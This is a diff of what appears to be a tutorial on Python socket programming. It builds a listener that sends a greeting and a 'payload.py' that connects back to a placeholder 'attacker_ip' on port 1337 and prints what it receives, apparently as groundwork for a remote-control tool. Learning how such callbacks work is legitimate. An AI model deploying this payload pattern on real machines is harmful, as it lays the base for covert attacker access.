@@ -1,4 +1,4 @@
-<h2 align="center">Server Side Programming</h2>
+<h2 align="center">Client Side Programming</h2>
 <p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
 
 - - - - - - - - - - - - - - - - - - - - - -
@@ -14,24 +14,26 @@ listener.listen()
 
 print("Server has started")
 
-## If there will be a communication to be accepted
-## use accept method to listener, then get the connection and address
 connection, address = listener.accept()
 print(f"Connected to {address}")
+
+## use connection object, in order to send information
+## do it in form of bytes through typecasting b"message"
+connection.send(b"Hello there!")
 ```
 ---
 > [payload.py](payload.py)
 ```python
-## payload to be excuted in the client side
 import socket
 
-## create the object of socket module
-## instantiate payload object with the same constant from listener
 payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-## call the connect method on payload
-## connect method will take the tuple with 2 arguments same as from listener
 payload.connect(("attacker_ip", 1337))
 
 print("Connected")
+
+## write code to receive and decode message
+output = payload.recv(2048) # 1024 is approximately 1K bytes, 2048 is 2K bytes of data
+## convert output in a form of string
+print(output.decode("utf-8"))
 ```
